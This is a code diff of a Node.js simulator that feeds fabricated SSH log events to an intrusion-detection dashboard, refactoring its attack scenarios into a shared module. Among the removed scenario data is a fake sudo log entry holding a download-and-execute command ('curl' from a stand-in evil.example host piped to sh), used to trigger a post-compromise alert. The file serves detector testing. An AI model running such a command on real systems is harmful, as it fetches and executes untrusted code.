@@ -11,6 +11,7 @@
 // hostname, so the server keeps the name you gave it in the dashboard - sending one would
 // overwrite it (that's how a real agent is meant to report its actual machine name).
 // Source IPs come from the reserved documentation ranges (RFC 5737), so they never hit a real host.
+// The same scenarios can also be run from the web app (menu: ทดสอบการโจมตี).
 
 const args = process.argv.slice(2);
 const opt = (name, def) => {
@@ -27,23 +28,10 @@ const ONLY = opt("scenario", "all");
 const LIVE = opt("live", false) === true;
 const PAUSE = Number(opt("pause", 700));
 
-const MIN = 60000;
-const run = Math.floor(Math.random() * 200) + 20; // unique per run so each run opens fresh incidents
-const ip = (range, last) => `${range}.${last ?? run}`;
-const NET = { a: "203.0.113", b: "198.51.100", c: "192.0.2" };
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const T = (minAgo) => new Date(Date.now() - minAgo * MIN).toISOString();
+const { makeScenarios, makeLivePool } = require("../simulation");
 
-const SEV = { ssh_login_failed: "warning", ssh_invalid_user: "high", connection_closed_preauth: "low" };
-const ev = (minAgo, type, user, addr, extra = {}) => ({
-  timestamp: typeof minAgo === "string" ? minAgo : T(minAgo),
-  event_type: type,
-  username: user || undefined,
-  ip_address: addr || undefined,
-  port: String(20000 + Math.floor(Math.random() * 40000)),
-  severity: SEV[type] || "info",
-  ...extra,
-});
+const run = Math.floor(Math.random() * 200) + 20; // unique per run so each run opens fresh incidents
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 async function send(hostIdx, logs) {
   const key = KEYS[hostIdx % KEYS.length];
@@ -65,140 +53,9 @@ async function send(hostIdx, logs) {
   return logs.length;
 }
 
-/* ---------------- Scenarios (order matters: later ones build on earlier ones) ---------------- */
-const scenarios = [
-  {
-    name: "baseline",
-    desc: "Every plain event type: login success (password + key), sudo, session closed, one typo'd password",
-    hosts: 1,
-    build: () => {
-      const l = [];
-      for (let i = 0; i < 4; i++) l.push(ev(600 - i * 90, "ssh_login_success", "alice", "10.0.4.21", { auth_method: i % 2 ? "publickey" : "password" }));
-      l.push(ev(40, "sudo_command", "alice", null, { message: "sudo /usr/bin/apt update" }));
-      l.push(ev(39, "session_closed", "alice", null));
-      l.push(ev(12, "ssh_login_failed", "bob", "10.0.4.30")); // one typo...
-      l.push(ev(11, "ssh_login_success", "bob", "10.0.4.30")); // ...then fine -> must NOT become an incident
-      return { 0: l };
-    },
-    expect: "No incident (a typo followed by a login is normal).",
-  },
-  {
-    name: "brute_force",
-    desc: "Many wrong passwords against one account from one IP, no success",
-    hosts: 1,
-    build: () => ({ 0: Array.from({ length: 24 }, (_, i) => ev(6 - i * 0.2, "ssh_login_failed", "webadmin", ip(NET.a, run))) }),
-    expect: "Brute force, risk MEDIUM (>=5) / HIGH (>=20).",
-  },
-  {
-    name: "brute_force_success",
-    desc: "Wrong passwords, then a successful login from the same IP, then sudo",
-    hosts: 1,
-    build: () => {
-      const a = ip(NET.a, run + 1);
-      const l = Array.from({ length: 9 }, (_, i) => ev(14 - i * 0.4, "ssh_login_failed", "root", a));
-      l.push(ev(9, "ssh_login_success", "root", a, { auth_method: "password" }));
-      l.push(ev(8, "sudo_command", "root", null, { message: "sudo /bin/bash -c 'curl http://evil.example/x.sh | sh'" }));
-      return { 0: l };
-    },
-    expect: "CRITICAL: login after many failures + post-compromise privileged activity.",
-  },
-  {
-    name: "username_enumeration",
-    desc: "Dozens of non-existent usernames from one IP",
-    hosts: 1,
-    build: () => {
-      const names = ["admin1", "test", "oracle", "postgres", "ubuntu", "git", "ftp", "user", "guest", "pi", "mysql", "nagios", "jenkins", "tomcat", "support", "info", "demo", "backup", "dev", "web", "deploy9", "vagrant"];
-      return { 0: names.map((u, i) => ev(5 - i * 0.15, "ssh_invalid_user", u, ip(NET.b, run))) };
-    },
-    expect: "Username enumeration, HIGH (>=20 usernames).",
-  },
-  {
-    name: "password_spraying",
-    desc: "Few tries per real account, spread across many accounts, slowly",
-    hosts: 1,
-    build: () => {
-      const a = ip(NET.b, run + 1);
-      const l = [];
-      ["alice", "deploy", "ubuntu", "admin", "www-data", "backup"].forEach((u, i) => {
-        l.push(ev(52 - i * 7, "ssh_login_failed", u, a), ev(50 - i * 7, "ssh_login_failed", u, a));
-      });
-      return { 0: l };
-    },
-    expect: "Password spraying, HIGH (6 accounts x 2 tries over ~50 min).",
-  },
-  {
-    name: "credential_stuffing",
-    desc: "A leaked list: many accounts tried once each, quickly; one of them works",
-    hosts: 1,
-    build: () => {
-      const a = ip(NET.c, run);
-      const users = ["john", "mary", "deploy", "git", "jenkins", "oracle", "mysql", "test", "guest", "pi", "support", "dev", "ops", "sales", "hr"];
-      const l = users.map((u, i) => ev(20 - i * 0.3, i % 4 === 3 ? "ssh_invalid_user" : "ssh_login_failed", u, a));
-      l.push(ev(14, "ssh_login_success", "deploy", a, { auth_method: "password" }));
-      return { 0: l };
-    },
-    expect: 'CRITICAL credential stuffing, account "deploy" marked compromised.',
-  },
-  {
-    name: "compromised_account",
-    desc: 'Account "deploy" (breached above) now attacked from other IPs, one succeeds',
-    hosts: 1,
-    build: () => ({
-      0: [
-        ev(6, "ssh_login_failed", "deploy", ip(NET.a, run + 10)),
-        ev(4, "ssh_login_failed", "deploy", ip(NET.a, run + 11)),
-        ev(3, "ssh_login_success", "deploy", ip(NET.a, run + 11), { auth_method: "password" }),
-      ],
-    }),
-    expect: "CRITICAL repeated attempts on a compromised account (needs credential_stuffing run first).",
-  },
-  {
-    name: "ssh_scanning",
-    desc: "Connections dropped before authentication (port scanner / fingerprinting)",
-    hosts: 1,
-    build: () => ({ 0: Array.from({ length: 16 }, (_, i) => ev(7 - i * 0.3, "connection_closed_preauth", null, ip(NET.c, run + 2))) }),
-    expect: "SSH scanning, MEDIUM (>=10) / HIGH (>=50).",
-  },
-  {
-    name: "abnormal_burst",
-    desc: "25+ events from one IP inside one minute (automated tooling)",
-    hosts: 1,
-    build: () => {
-      const a = ip(NET.a, run + 3);
-      return { 0: Array.from({ length: 28 }, (_, i) => ev(new Date(Date.now() - 4 * MIN + i * 1500).toISOString(), "ssh_login_failed", "scanner", a)) };
-    },
-    expect: "Abnormal source behavior: burst, HIGH.",
-  },
-  {
-    name: "new_source_login",
-    desc: 'Known user "alice" logs in from an IP never seen before',
-    hosts: 1,
-    build: () => ({ 0: [ev(1, "ssh_login_success", "alice", ip(NET.b, run + 4), { auth_method: "password" })] }),
-    expect: "Login from new source, MEDIUM (HIGH if 00:00-05:59 Bangkok time or the IP attacked before).",
-  },
-  {
-    name: "cross_host",
-    desc: "One attacker IP probes several of your servers (needs 2+ keys: --key k1,k2)",
-    hosts: 2,
-    build: () => {
-      const a = ip(NET.b, run + 5);
-      return {
-        0: [ev(9, "ssh_login_failed", "operator", a), ev(8.5, "ssh_login_failed", "svc", a), ev(8, "connection_closed_preauth", null, a)],
-        1: [ev(7, "ssh_invalid_user", "postgres", a), ev(6.5, "ssh_login_failed", "operator", a)],
-      };
-    },
-    expect: "Cross-host campaign, HIGH, one incident per server.",
-  },
-];
-
-const LIVE_POOL = [
-  () => ev(0, "ssh_login_success", ["alice", "bob", "carol"][Math.floor(Math.random() * 3)], "10.0.4." + (20 + Math.floor(Math.random() * 5))),
-  () => ev(0, "ssh_login_failed", ["root", "admin", "ubuntu"][Math.floor(Math.random() * 3)], ip(NET.a, 1 + Math.floor(Math.random() * 250))),
-  () => ev(0, "ssh_invalid_user", "user" + Math.floor(Math.random() * 99), ip(NET.b, 1 + Math.floor(Math.random() * 250))),
-  () => ev(0, "connection_closed_preauth", null, ip(NET.c, 1 + Math.floor(Math.random() * 250))),
-  () => ev(0, "sudo_command", "alice", null, { message: "sudo systemctl restart nginx" }),
-  () => ev(0, "session_closed", "alice", null),
-];
+/* Scenarios live in ../simulation.js (shared with the web "attack test" page); order matters there */
+const scenarios = makeScenarios(run);
+const LIVE_POOL = makeLivePool();
 
 /* ---------------- Prompts (used when --url / --key are not given) ---------------- */
 const readline = require("readline");
